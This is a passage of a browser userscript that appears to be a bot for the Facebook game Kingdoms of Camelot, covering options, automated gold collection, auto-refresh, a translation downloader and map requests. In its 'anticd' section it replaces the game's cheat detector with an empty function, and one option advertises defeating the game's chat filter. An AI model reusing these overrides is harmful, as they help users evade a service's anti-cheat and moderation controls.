        <TR><TD><INPUT id=PubReq type=checkbox '+ (GlobalOptions.autoPublishGamePopups?'CHECKED ':'') +'/></td><TD>'+translate("Auto publish Facebook posts for")+' '+ htmlSelector({0:'----', 80:'Everyone', 50:'Friends of Friends', 40:'Friends Only', 10:'Only Me'},GlobalOptions.autoPublishPrivacySetting,'id=selectprivacymode') +' '+translate("(For all domains)")+'<span style="color:#800; font-weight:bold"><sup>'+translate("*Only select ONE of these")+'</sup></span></td>\
        <TR><TD><INPUT id=cancelReq type=checkbox '+ (GlobalOptions.autoCancelGamePopups?'CHECKED ':'') + '/></td><TD>'+translate("Auto cancel Facebook posts")+'<span style="color:#800; font-weight:bold"><sup>'+translate("*Only select ONE of these")+'</sup></span></td>\
        <TR><TD><INPUT id=MapExtra type=checkbox /></td><TD>'+translate("Show Player & Might in map")+'.</td></tr>\
        <TR><TD><INPUT id=deletetoggle type=checkbox /></td><TD> '+translate("Auto delete barb/transport reports from you")+'</td></tr>\
        <TR><TD><INPUT id=deletes0toggle type=checkbox /></td><TD> '+translate("Auto delete transport reports to you")+'</td></tr>\
        <TR><TD><INPUT id=deletes1toggle type=checkbox /></td><TD> '+translate("Auto delete wild reports")+'</td></tr>\
        <TR><TD><INPUT id=deletes2toggle type=checkbox /></td><TD> '+translate("Auto delete crest reports regardless of target type")+'</td></tr>\
        <TR><TD><INPUT id=deletes3toggle type=checkbox /></td><TD> '+translate("Auto delete incoming attack reports from alliances I'm friendly to")+'</td></tr>\
        <TR><TD><INPUT id=advanced type=checkbox /></td><TD> '+translate("Scripters tab")+'</td></tr>\
        <TR><TD><INPUT id=MAgicBOx type=checkbox /></td><TD> '+translate("Kill merlins magic box's on startup")+'</td></tr>\
        <TR><TD><INPUT id=CFilter type=checkbox /></td><TD> '+translate("Defeat kabam chat filter so some words can be said.  ex \'deSCRIPTion\'")+'</td></tr>\
       <TR><TD><INPUT id=MKLag type=checkbox /></td><TD> '+translate("Fix stalled marches and missing knights.  EXPERIMENTAL")+'</td></tr>\
        </table><BR><BR><HR>'+translate("Note that if a checkbox is greyed out there has probably been a change of KofC\'s code, rendering the option inoperable")+'.</div>';
        m += strButton20(translate('Reset ALL Options'), 'id=ResetALL');
      div.innerHTML = m;

      document.getElementById('selectScreenMode').addEventListener ('change', function(){
              GlobalOptions.pbWideScreenStyle = document.getElementById('selectScreenMode').value;
              GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
      },false);    
      document.getElementById('selectprivacymode').addEventListener ('change', function(){
              GlobalOptions.autoPublishPrivacySetting = document.getElementById('selectprivacymode').value;
            GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
      },false);
        
      document.getElementById('PubReq').addEventListener ('change', function(){
              GlobalOptions.autoPublishGamePopups = document.getElementById('PubReq').checked;
            GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
      },false);    
      document.getElementById('cancelReq').addEventListener ('change', function(){
      		GlobalOptions.autoCancelGamePopups = document.getElementById('cancelReq').checked;
			GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
      },false);	
      document.getElementById('pbupdatebeta').addEventListener ('change', function(){
              GlobalOptions.pbupdatebeta = document.getElementById('pbupdatebeta').value;
            AutoUpdater_158505.beta = GlobalOptions.pbupdatebeta;
            GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
      },false);    
      document.getElementById('pbupdatenow').addEventListener ('click', function(){
            AutoUpdater_158505.call(true,true);
      },false);    
      document.getElementById('pbsendmeaway').addEventListener ('click', function(){
            GlobalOptions.pbNoMoreKabam = document.getElementById('pbsendmeaway').checked;
            GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
      },false);    
      
      document.getElementById('ResetALL').addEventListener ('click', function(){
              var serverID = getServerId();
              RemoveList = (GM_listValues());
              for (i=0;i<RemoveList.length;i++){
                  logit(RemoveList[i]);
                  GM_deleteValue(RemoveList[i]);
              }
              ResetAll=true;
              reloadKOC();
      },false);

      document.getElementById('pbWatchEnable').addEventListener ('change', t.e_watchChanged, false);
      document.getElementById('pbWideOpt').addEventListener ('change', t.e_wideChanged, false);
      document.getElementById('pbupdate').addEventListener ('change', t.e_updateChanged, false);
      t.changeOpt ('pbtogOpacity', 'Opacity');
      t.togOpt ('pballowWinMove', 'pbWinDrag', mainPop.setEnableDrag);
      t.togOpt ('pbTrackWinOpen', 'pbTrackOpen');
      t.togOpt ('pbHideOnGoto', 'hideOnGoto');
      t.togOpt ('pbFairie', 'pbKillFairie', FairieKiller.setEnable);
      t.togOpt ('pbGoldEnable', 'pbGoldEnable', CollectGold.setEnable);
      t.changeOpt ('pbgoldLimit', 'pbGoldHappy');
      t.togOpt ('pbFoodToggle', 'pbFoodAlert');
      t.changeOpt ('pbeverymins', 'pbEveryMins' , RefreshEvery.setTimer);
      t.togOpt ('pbEveryEnable', 'pbEveryEnable', RefreshEvery.setEnable);
      t.togOpt ('pbChatREnable', 'pbChatOnRight', WideScreen.setChatOnRight);
      t.togOpt ('pbWMapEnable', 'pbWideMap', WideScreen.useWideMap);
      t.togOpt ('pbEveryEnable', 'pbEveryEnable', RefreshEvery.setEnable);
      t.togOpt ('HelReq', 'HelpRequest');
      t.togOpt ('DelReq', 'DeleteRequest');
      t.togOpt ('DelAC', 'DeletegAl');
      t.togOpt ('MapExtra', 'MapShowExtra');
      t.togOpt ('deletetoggle', 'DeleteMsg');
      t.togOpt ('deletes0toggle', 'DeleteMsgs0');
      t.togOpt ('deletes1toggle', 'DeleteMsgs1');
      t.togOpt ('deletes2toggle', 'DeleteMsgs2');    
      t.togOpt ('deletes3toggle', 'DeleteMsgs3');      
      t.togOpt ('advanced', 'ScripterTab');          
      t.togOpt ('MAgicBOx', 'KMagicBox');
      t.togOpt ('CFilter', 'filter');
      t.togOpt ('MKLag', 'mklag');
      t.togOpt ('pbmaintoggle', 'amain');
      t.changeOpt ('pbwhichcity', 'smain');
    } catch (e) {
      div.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';  
    }      
  },

  hide : function (){
  },

  show : function (){
  },

  togOpt : function (checkboxId, optionName, callOnChange){
    var t = Tabs.Options;
    var checkbox = document.getElementById(checkboxId);
    if (Options[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Options[optionName] = this.checked;
      saveOptions();
      if (callOnChange)
        callOnChange (this.checked);
    }
  },
  
  changeOpt : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = Options[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Options[optionName] = this.value;
      saveOptions();
      if (callOnChange)
        callOnChange (this.value);
    }
  },
  
  e_watchChanged : function (){
    GlobalOptions.pbWatchdog = document.getElementById('pbWatchEnable').checked;
    GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));  
  },
  
  e_wideChanged : function (){
    GlobalOptions.pbWideScreen = document.getElementById('pbWideOpt').checked;
    GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));  
  },
  
  e_updateChanged : function (){
    GlobalOptions.pbupdate = document.getElementById('pbupdate').checked;
    GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));  
  },
  
}





/************************ Gold Collector ************************/
var CollectGold = {
  timer : null,
  lastCollect : {},
      
  init : function (){
    var t = CollectGold;
    for (var c=0; c<Cities.numCities; c++)
      t.lastCollect['c'+ Cities.cities[c].id] = 0;
    if (Options.pbGoldEnable)
      t.setEnable (true);
  },
  
  setEnable : function (tf){
    var t = CollectGold;
    clearTimeout (t.timer);
    if (tf)
      t.tick();
  },

  colCityName : null,
  colHappy : 0,  
  tick : function (){
    var t = CollectGold;
    for (var c=0; c<Cities.numCities; c++){
      var city = Cities.cities[c];
      var happy = Seed.citystats['city'+ city.id].pop[2];
      var since = unixTime() - t.lastCollect['c'+city.id];
      if (happy>=Options.pbGoldHappy && since>15*60){
        t.lastCollect['c'+city.id] = unixTime();
        t.colCityName = city.name;
        t.colHappy = happy;
        t.ajaxCollectGold (city, t.e_ajaxDone);
        break;
      }
    }
    t.timer = setTimeout (t.tick, 15000);    
  },

  e_ajaxDone : function (rslt){
    var t = CollectGold;
    if (rslt.ok)
      actionLog ('Collected '+ rslt.goldGained +' gold for '+ t.colCityName +' (happiness was '+ t.colHappy +')');
    else
      actionLog ('Error collecting gold for '+ t.colCityName +': <SPAN class=boldRed>'+ rslt.errorMsg +'</span>');
  },
  
  ajaxCollectGold : function (city, notify){
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.cid = city.id;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/levyGold.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        if (notify)  
          notify (rslt);
      },
      onFailure: function (rslt) {
        if (notify)  
          notify (rslt);
      }
    });
  },
}

/************************ Refresh Every X minutes ************************/
var RefreshEvery  = {
  timer : null,
  PaintTimer : null,
  NextRefresh : 0,
  box : null,
  target : null,
  
  init : function (){
    var t = RefreshEvery;
    t.creatediv();
    if (Options.pbEveryMins < 1)
        Options.pbEveryMins = 1;
    RefreshEvery.setEnable (Options.pbEveryEnable);
  },
  
  creatediv : function(){
    var t = RefreshEvery;
    t.target = document.getElementById('comm_tabs');
    if(t.target == null){
        setTimeout(t.creatediv, 2000);
        return;
    }
    t.box = document.createElement('div');
    t.target.appendChild(t.box);
    t.box.addEventListener('click', t.setEnable, false);
  },
  
  setEnable : function (tf){
    var t = RefreshEvery;
    clearTimeout (t.timer);
    if (tf) {
      //t.timer = setTimeout (t.doit, Options.pbEveryMins*60000);
      t.NextRefresh = unixTime() + (Options.pbEveryMins*60);
      t.timer = setTimeout (t.Paint, 1000);
    } else {
        //t.PaintTimer = null;
        t.timer = null;
        t.NextRefresh = 0;
        t.box.innerHTML = '<BR><FONT color=white><B>&nbsp;&nbsp;&nbsp;&nbsp;'+ getMyAlliance()[1] + ' (' + getServerId() +')</b></font>';
    }
  },
  
  doit : function (){
    actionLog ('Refreshing ('+ Options.pbEveryMins +' minutes expired)');
    reloadKOC();
  },
  
  setTimer : function (){
    var t = RefreshEvery;
    clearTimeout (t.timer);
    if (Options.pbEveryMins < 1) Options.pbEveryMins = 1;
    RefreshEvery.setEnable (Options.pbEveryEnable);
  },
  
  Paint : function(){
     var t = RefreshEvery;
     if(t.timer == null) return;
     now = unixTime();
     //var text = '<FONT color=white><B>&nbsp;&nbsp;&nbsp;&nbsp;'+ getMyAlliance()[1] + ' (' + getServerId() +')</b></font>';
     var text = '';
     var Left = parseInt(t.NextRefresh - now);
     if ( Left < 0){
        Left = 0;
        t.doit();
     }
     if ( Left < 60) text += '<BR>&nbsp;&nbsp;&nbsp;&nbsp;<FONT color=white>'+translate("Next refresh in")+': </font><FONT color=red><B>'+ timestr(Left) +'</b></font></div>';
     else text += '<BR>&nbsp;&nbsp;&nbsp;&nbsp;<FONT color=white>'+translate("Next refresh in")+': <B>'+ timestr(Left) +'</b></font></div>';

     t.box.innerHTML = text;
     t.timer = setTimeout (t.Paint, 1000);
  },
}
/************************ Fairie Killer ************************/
var FairieKiller  = {
  saveFunc : null,
  init : function (tf){
    if (firefoxVersion.substring(0,4) == '4.0b')  // bug in firefox 4.0b10 causes syntax error with: "var func = eval ('function (){}');"
      return;
    FairieKiller.saveFunc = unsafeWindow.Modal.showModalUEP;
    FairieKiller.setEnable (tf);
  },
  setEnable : function (tf){
    if (tf)
      unsafeWindow.Modal.showModalUEP = eval ('function FairieKiller (a,b,c) {actionLog ("Blocked Faire popup");}');
    else
      unsafeWindow.Modal.showModalUEP = FairieKiller.saveFunc;
  },
}

/********** facebook watchdog: runs only in 'http://apps.facebook.com/kingdomsofcamelot/*' instance!  ******/
function facebookWatchdog (){
  var INTERVAL = 50000; // wait 50 seconds minute before checking DOM
  if (!GlobalOptions.pbWatchdog)
    return;
  setTimeout (watchdog, INTERVAL);
  
// TODO: actionLog ?  
  function watchdog (){
    try {
//      if (document.getElementById('app_content_130402594779').firstChild.firstChild.childNodes[1].firstChild.tagName!='IFRAME'){
      if (document.getElementById('app_content_130402594779') == null){
        logit ("KOC NOT FOUND!");
        KOCnotFound(5*60);
      }
    } catch (e){
      logit ("KOC NOT FOUND!");
      KOCnotFound(4*60);
    }
  }
}


function kocWatchdog (){
  var INTERVAL = 10000; // wait 30 seconds before checking DOM
  if (!GlobalOptions.pbWatchdog)
    return;
  setTimeout (kwatchdog, INTERVAL);
  function kwatchdog (){
logit ("KOC WATCHDOG: "+ document.getElementById('mod_maparea')+" "+document.location);    
    if (document.getElementById('mod_maparea')==null){
      logit ("KOC not loaded");
      KOCnotFound(20);
    }     
  }
}


function KOCnotFound(secs){
  var div;
  var countdownTimer = null;
  var endSecs = (new Date().getTime()/1000) + secs;
    
  div = document.createElement('div');
  div.innerHTML = '<DIV style="font-size:18px; background-color:#a00; color:#fff"><CENTER><BR>KOC Power Bot has detected that KOC is not loaded<BR>Refreshing in <SPAN id=pbwdsecs></span><BR><INPUT id=pbwdcan type=submit value="Cancel Refresh"><BR><BR></div>';
  document.body.insertBefore (div, document.body.firstChild);
  document.getElementById('pbwdcan').addEventListener('click', cancel, false);
  countdown();
      
  function countdown (){
    var secsLeft = endSecs - (new Date().getTime()/1000);
    document.getElementById('pbwdsecs').innerHTML = timestr(secsLeft);
    if (secsLeft < 0)
      reloadKOC();
    countdownTimer = setTimeout (countdown, 1000);
  }
  function cancel (){
    clearTimeout (countdownTimer);
    document.body.removeChild (div);
  }
}



var WideScreen = {
  chatIsRight : false,
  useWideMap : false,
  rail : null,
  
  init : function (){
    t = WideScreen;
    if (GlobalOptions.pbWideScreen){
      t.rail = searchDOM (document.getElementById('mod_maparea'), 'node.className=="maparea_rrail"', 10);
      GM_addStyle ('.modalCurtain {width:760px !important} .mod_comm_mmb{z-index:0 !important}');  
      try {
        document.getElementById('progressBar').parentNode.removeChild(document.getElementById('progressBar'));
        document.getElementById('crossPromoBarContainer').parentNode.removeChild(document.getElementById('crossPromoBarContainer'));
      } catch (e) {
      }
    }
  },
        
  setChatOnRight : function (tf){
    t = WideScreen;
    if (tf == t.chatIsRight || !GlobalOptions.pbWideScreen)
      return;
    if (tf){
      var chat = document.getElementById('kocmain_bottom').childNodes[1];
      if (!chat || chat.className!='mod_comm')
        setTimeout (function (){t.setChatOnRight(tf)}, 1000);
      chat.style.top = '-624px';
      chat.style.left = '760px';
      chat.style.height = '720px';
      chat.style.background = 'url("'+ CHAT_BG_IMAGE +'")';
      document.getElementById('mod_comm_list1').style.height = '580px';
      document.getElementById('mod_comm_list2').style.height = '580px';
    } else {
      var chat = document.getElementById('kocmain_bottom').childNodes[1];
      chat.style.top = '0px';
      chat.style.left = '0px';
      chat.style.height = '';
      chat.style.background = '';
      document.getElementById('mod_comm_list1').style.height = '287px';
      document.getElementById('mod_comm_list2').style.height = '287px';
    }
    t.chatIsRight = tf;
  },
  
  useWideMap : function (tf) {
      t = WideScreen;
      if (tf == t.useWideMap || !GlobalOptions.pbWideScreen)
          return;
      if (tf){
      t.rail.style.display = 'none';
      document.getElementById('mapwindow').style.height = "436px";
      document.getElementById('mapwindow').style.width = "1220px";
      document.getElementById('mapwindow').style.zIndex = "50";
      } else {
      t.rail.style.display = 'block';
      document.getElementById('mapwindow').style.height = "439px";
      document.getElementById('mapwindow').style.width = "760px";
      document.getElementById('mapwindow').style.zIndex = "";
      }
  },
}

/******************* Language Tab ******************/
Tabs.Language = {
  tabOrder : 0,                    // order to place tab in top bar
  tabLabel : 'Language',      
  tabDisabled : !ENABLE_SAMPLE_TAB,  // label to show in main window tabs
  myDiv : null,
  language : {needTranslation:{}},
  link : {"http://koc-power-bot.googlecode.com/svn/trunk/translation/translation_en.js":"en"},
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.Language;
    t.myDiv = div;
    var m = "<DIV class=pbStat>"+translate("Language Settings")+"</div><TABLE><TR>\
            <TD>"+translate("Set Language")+" : "+ htmlSelector({en:"en"},Options.language,"id=pblang_type") +"</td>\
            <TD><input id=pblang_update value='"+translate("Save Settings")+"' type=submit DISABLED /><span id=pblang_msg ></span></td></tr>\
            <TR><TD>"+translate("Language files download")+" : "+ htmlSelector(t.link,null,"id=pblang_link") +"</td>\
            <td><input id=pblang_download value='"+translate("Download")+"' type=submit /></td></tr>\
            <TR><TD>"+translate("Show current language array:")+" </td>\
            <TD><input id=pblang_show value='"+translate("Show")+"' type=submit /></td></tr>";
    t.myDiv.innerHTML = m;
    
    document.getElementById("pblang_type").addEventListener('change', function (){
        if(Options.language != document.getElementById("pblang_type").value)
            document.getElementById("pblang_update").disabled = false;
        else
            document.getElementById("pblang_update").disabled = true;
    },false);
    document.getElementById("pblang_update").addEventListener('click', function (){
        var language = document.getElementById("pblang_type").value;
        var s = GM_getValue ("Language_"+language);
        if (s != null){
            var lang = JSON2.parse (s);
            t.sendMessage("Loaded <b>"+language+"</b> Version <b>"+lang.Version+"</b>");
            Options.language = document.getElementById("pblang_type").value;
        } else {
            t.sendMessage("<span class=boldRed> Language <b>"+language+"</b> not found. Please download language file!</span>");
            document.getElementById("pblang_type").value = Options.language;
        }
    },false);
    document.getElementById("pblang_download").addEventListener('click', function (){
        document.getElementById("pblang_download").disabled = true;
        GM_xmlhttpRequest({
            method: 'GET',
            url: document.getElementById("pblang_link").value,
            onload: function(xpr) {t.updatelanguage(xpr.responseText, document.getElementById("pblang_link").value);},
            onerror: function(xpr) {t.updatelanguage(xpr.responseText, false);}
        });
    },false);
    document.getElementById("pblang_show").addEventListener('click', function(){
        t.showlanguage();
    },false);
  },
  
  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.Language;
  },
  
  show : function (){
      
  },
  
  showlanguage : function(){
      var t = Tabs.Language;
      t.poplangshow = new pbPopup('pbShowLanguage', 10, 10, 600, 500, true, function() {t.poplangshow.destroy();});
      t.poplangshow.getTopDiv().innerHTML = '<TD><B>'+translate("Language Array:")+'</td>';
      t.poplangshow.getMainDiv().innerHTML = '<DIV style="max-height:440px;overflow-y:auto"><TABLE style="overflow-y:auto" align=center cellpadding=0 cellspacing=0 width=100% class="pbTab" id="pblang_showarray"></table></div><div id=pblang_status ></div>';
      t.paintlanguagearray();
      t.poplangshow.show(true);
  },
  
  paintlanguagearray : function(){
      var t = Tabs.Language;
      var m = '';
      for (var k in t.language.needTranslation){
          m += "<TR><TD style='max-width:250px;word-wrap:break-word' >"+k.escape_space()+": </td><TD><input id='pblang_"+escape(k)+"' value='"+(t.language.needTranslation[k]==1?'':t.language.needTranslation[k].unescape_space())+"' /></td></tr>";
      }
      for (var k in t.language){
          if(k != "needTranslation")
            m += "<TR><TD style='max-width:250px;word-wrap:break-word' >"+k.escape_space()+": </td><TD>"+t.language[k].escape_space()+"</td></tr>";
      }
      document.getElementById("pblang_showarray").innerHTML = m;
      document.getElementById("pblang_status").innerHTML = "<center><input type=submit id=pblang_statussave value=Save /><input type=submit id=pblang_statusexport value='Export new translation' /></center>";
      document.getElementById("pblang_statussave").addEventListener('click', function(){
        for (var k in t.language.needTranslation){
            var j = document.getElementById("pblang_"+escape(k)).value;
            if(j != '')
                t.language.needTranslation[k] = j;
        }
        saveLanguage();
      },false);
      document.getElementById("pblang_statusexport").addEventListener('click', function(){
          t.export();
      },false);
  },  
  
  export : function(){
      var t = Tabs.Language;
      var pop = new pbPopup('pbExportLanguage', 0, 0, 400, 400, true, function() {this.destroy();});
      var m = "<textarea rows=15 cols=50 >";
       for (var k in t.language.needTranslation){
          if(t.language.needTranslation[k] != 1)
            m += "\""+k+"\":\""+t.language.needTranslation[k]+"\",\n";
      }
      m += "</textarea>";
      pop.getMainDiv().innerHTML = m;
      pop.show(true);
  },
  
  sendMessage : function (msg){
      document.getElementById("pblang_msg").innerHTML = msg;
  },
  
  updatelanguage : function(result, response){
      var t = Tabs.Language;
      if(!response) {
          t.sendMessage("<span class=boldRed>Error loading file. Try again later</span>");
      document.getElementById("pblang_download").disabled = false;
          return;
      }
      var rslt = null;
      try{
        rslt = JSON2.parse(result);
      } catch (e){
        t.sendMessage("<span class=boldRed>Error reading file. Please notify devs</span>");
        logit(inspect(e,7,1));
        document.getElementById("pblang_download").disabled = false;
        return;
      }
      var s = GM_getValue ("Language_"+rslt.curlang);
      if (s != null){
        var lang = JSON2.parse (s);
        for (k in rslt){
            if(lang.needTranslation)
                if(lang.needTranslation[k]) //Remove from array if already translated
                    delete lang.needTranslation[k];
            lang[k] = rslt[k];
        }
      } else {
          var lang = rslt;
      }
      setTimeout (function (){GM_setValue ('Language_'+rslt.curlang, JSON2.stringify(lang));}, 0);
      t.sendMessage("Successfully loaded language file. Please refresh");
      document.getElementById("pblang_download").disabled = false;
  },
}

function readLanguage () {
    var t = Tabs.Language;
    if(!Options.language) return;
    var s = GM_getValue ("Language_"+Options.language);
    if (s != null){
        var lang = JSON2.parse (s);
        for (k in lang){
            t.language[k] = lang[k];
        }
    }
    t.language.curlang = Options.language;
}

function saveLanguage (){
    var t = Tabs.Language;
    setTimeout (function (){GM_setValue ('Language_'+t.language.curlang, JSON2.stringify(t.language));}, 0);
}

function translate (str) {
    var t = Tabs.Language;
    if(t.language[str])
        return t.language[str];
    else {
        if(t.language.needTranslation[str] == undefined)
            t.language.needTranslation[str] = 1;
        else if (t.language.needTranslation[str] != 1)
            return t.language.needTranslation[str];
    }
    return str;    
}


/*******************   KOC Map interface ****************/
// 0:bog, 10:grassland, 11:lake, 20:woods, 30:hills, 40:mountain, 50:plain, 51:city / barb, 53:misted city
function CMapAjax (){
  this.normalize = normalize;  
  this.request = request;

  function request (left, top, width, notify){    
    var left = parseInt(left / 5) * 5;
    var top = parseInt(top / 5) * 5;
    var width = parseInt((width+4) / 5) * 5;
    
    var blockString = generateBlockList(left, top, width);
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.blocks = blockString;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/fetchMapTiles.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify(left, top, width, rslt);
      },
      onFailure: function (rslt) {
        notify(left, top, width, rslt);
      }
    });
    function generateBlockList (left, top, width) {
      var width5 = parseInt(width / 5);
      var bl = [];
      for (x=0; x<width5; x++){
        var xx = left + (x*5);
        if (xx > 745)
          xx -= 750;
        for (y=0; y<width5; y++){
          var yy = top + (y*5);
          if (yy > 745)
            yy -= 750;
          bl.push ('bl_'+ xx +'_bt_'+ yy);
        }
      }
      return bl.join(",");
    }
  }
 
  function normalize  (x){
    if ( x >= 750)
      x -= 750;
    else if (x < 0)
      x += 750;
    return parseInt (x/5) * 5;
  }
}

var anticd = {
  isInited : false,
  KOCversion : '?',
  
  init: function (){
    if (this.isInited)
      return this.KOCversion;
    unsafeWindow.cm.cheatDetector.detect = eval ('function a (){}');
    var scripts = document.getElementsByTagName('script');
    for (var i=0; i<scripts.length; i++){
      if (scripts[i].src.indexOf('camelotmain') >=0){
        break;
      }
    }
    if (i<scripts.length){
      var m = scripts[i].src.match (/camelotmain-(.*).js/);  
      if (m)
        this.KOCversion = m[1];
    }
    this.isInited = true;
    // more coming soon :)
  },
  
  getKOCversion : function (){
    return this.KOCversion;
  },
}
try {
  anticd.init ();
} catch (e){
  logit ("ANTICD error: "+ e);
}

var tabManager = {
  tabList : {},           // {name, obj, div}
  currentTab : null,
  
  init : function (mainDiv){
    var t = tabManager;
    var sorter = [];
    for (k in Tabs){
      if (!Tabs[k].tabDisabled){  
        t.tabList[k] = {};
        t.tabList[k].name = k;
        t.tabList[k].obj = Tabs[k];
        if (Tabs[k].tabLabel != null)
          t.tabList[k].label = Tabs[k].tabLabel;
        else
          t.tabList[k].label = k;
        if (Tabs[k].tabOrder != null)
          sorter.push([Tabs[k].tabOrder, t.tabList[k]]);
        else
          sorter.push([1000, t.tabList[k]]);
        t.tabList[k].div = document.createElement('div');
      }
    }

    sorter.sort (function (a,b){return a[0]-b[0]});
    var m = '<TABLE cellspacing=3 class=pbMainTab><TR>';
    for (var i=0; i<sorter.length; i++) {
      m += '<TD class=spacer></td><TD align=center class=notSel id=pbtc'+ sorter[i][1].name +' ><A><SPAN>'+ sorter[i][1].label +'</span></a></td>';
      //m += '<TD align=center class=notSel id=pbtc'+ sorter[i][1].name +' ><A><SPAN>'+ sorter[i][1].label +'</span></a></td>';
      if ((i+1)%9 == 0) m+='</tr><TR>';
    }
    m+='</tr></table>';  
    //m += '<TD class=spacer width=90% align=right>'+ Version +'&nbsp;</td></tr></table>';
    mainPop.getMainTopDiv().innerHTML = m;
    
    for (k in t.tabList) {
      if (t.tabList[k].name == Options.currentTab)
        t.currentTab =t.tabList[k] ;
      document.getElementById('pbtc'+ k).addEventListener('click', this.e_clickedTab, false);
      var div = t.tabList[k].div;
      div.style.display = 'none';
      div.style.height = '100%';
      mainDiv.appendChild(div);
      try {
        t.tabList[k].obj.init(div);
      } catch (e){
        div.innerHTML = "INIT ERROR: "+ e;
      }
    }
    
    if (t.currentTab == null)
      t.currentTab = sorter[0][1];    
    t.setTabStyle (document.getElementById ('pbtc'+ t.currentTab.name), true);
    t.currentTab.div.style.display = 'block';
  },
  
  hideTab : function (){
    var t = tabManager;
    t.currentTab.obj.hide();
  },
  
  showTab : function (){
    var t = tabManager;
    t.currentTab.obj.show();
  },
    
  setTabStyle : function (e, selected){
    if (selected){
      e.className = 'sel';
    } else {
      e.className = 'notSel';
    }
  },
  
  e_clickedTab : function (e){
    var t = tabManager;
    var newTab = t.tabList[e.target.parentNode.parentNode.id.substring(4)];
    if (t.currentTab.name != newTab.name){
      t.setTabStyle (document.getElementById ('pbtc'+ t.currentTab.name), false);
      t.setTabStyle (document.getElementById ('pbtc'+ newTab.name), true);
      t.currentTab.obj.hide ();
      t.currentTab.div.style.display = 'none';
      t.currentTab = newTab;
      newTab.div.style.display = 'block';
      Options.currentTab = newTab.name;      
    }
    newTab.obj.show();
  },
}

function onUnload (){
  Options.pbWinPos = mainPop.getLocation();
  if (!ResetAll) saveOptions();
  saveLanguage();
}

function mouseMainTab (me){   // right-click on main button resets window location
  if (me.button == 2){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    mainPop.setLocation ({x: c.x+4, y: c.y+c.height});
  }
}

function eventHideShow (){
  if (mainPop.toggleHide(mainPop)){
    tabManager.showTab();
    Options.pbWinIsOpen = true;
  } else {
    tabManager.hideTab();
    Options.pbWinIsOpen = false;
  }
  saveOptions();
}

function hideMe (){
  mainPop.show (false);
  tabManager.hideTab();
  Options.pbWinIsOpen = false;
  saveOptions();
}

function showMe (){
  mainPop.show (true);
  tabManager.showTab();
  Options.pbWinIsOpen = true;
  saveOptions();
}

function addMyFunction (func){      // add function to run in our own scope
  unsafeWindow[func.name] = func;
}

function addUwFunction (func){      // add function to run in unsafeWindow's scope
  var scr = document.createElement('script');
    scr.innerHTML = func.toString();
    document.body.appendChild(scr);
}

function alterUwFunction (funcName, frArray){
  try {
    funcText = unsafeWindow[funcName].toString();
    rt = funcText.replace ('function '+funcName, 'function');
    for (i=0; i<frArray.length; i++){
      x = rt.replace(frArray[i][0], frArray[i][1]);
      if (x == rt)
        return false;
      rt = x;
    }
    js = funcName +' = '+ rt;
      var scr=document.createElement('script');
      scr.innerHTML=js;
      document.body.appendChild(scr);
      return true;
  } catch (err) {
    return false;
  }
}

function officerId2String (oid){
  if (oid==null)
    return '';
  else if (oid==3)
    return 'Officer';
  else if (oid==2)
    return 'Vice Chance';
  else if (oid==1)
    return 'Chancellor';
  return '';
}

var knightRoles = {
  Foreman : 'politics',
  Marshall : 'combat',
  Alchemystic : 'intelligence',
  Steward : 'resourcefulness',
};

function officerId2String (oid){
  if (oid==null)
    return '';
  else if (oid==3)
    return 'Officer';
  else if (oid==2)
    return 'Vice Chance';
  else if (oid==1)
    return 'Chancellor';
  return '';
}

var fortNamesShort = {
  53: "Crossbows",
  55: "Trebuchet",
  60: "Trap",
  61: "Caltrops",
  62: "Spiked Barrier",
}

// onClick (city{name, id, x, y}, x, y)   city may be null!
function CdispCityPicker (id, span, dispName, notify, selbut, disable_list){
  function CcityButHandler (t){
    var that = t;
    this.clickedCityBut = clickedCityBut;
    function clickedCityBut (e){
      if (that.selected != null)
        that.selected.className = "castleBut castleButNon";
      that.city = Cities.cities[e.target.id.substr(that.prefixLen)];
      if (that.dispName)
        document.getElementById(that.id+'cname').innerHTML = that.city.name;
      e.target.className = "castleBut castleButSel";
      that.selected = e.target;
      if (that.coordBoxX){
        that.coordBoxX.value = that.city.x;
        that.coordBoxY.value = that.city.y;
        var evt = document.createEvent("HTMLEvents");
        evt.initEvent('change', true, true ); // event type,bubbling,cancelable
        that.coordBoxX.dispatchEvent(evt);
        that.coordBoxY.dispatchEvent(evt);
        that.coordBoxX.style.backgroundColor = '#ffffff';
        that.coordBoxY.style.backgroundColor = '#ffffff';
      }
      if (that.notify != null)
        that.notify(that.city, that.city.x, that.city.y);
    }
  }

  function selectBut (idx){
    document.getElementById(this.id+'_'+idx).click();
  }

  function bindToXYboxes (eX, eY){
    function CboxHandler (t){
      var that = t;
      this.eventChange = eventChange;
      if (that.city){
        eX.value = that.city.x;
        eY.value = that.city.y;
      }
      function eventChange (){
        var xValue=that.coordBoxX.value.trim();
            var xI=/^\s*([0-9]+)[\s|,|-|.]+([0-9]+)/.exec(xValue);                 
            if(xI) {
                that.coordBoxX.value=xI[1]
                that.coordBoxY.value=xI[2]
            }
        var x = parseInt(that.coordBoxX.value, 10);
        var y = parseInt(that.coordBoxY.value, 10);
        if (isNaN(x) || x<0 || x>750){
          that.coordBoxX.style.backgroundColor = '#ff8888';
          return;
        }
        if (isNaN(y) || y<0 || y>750){
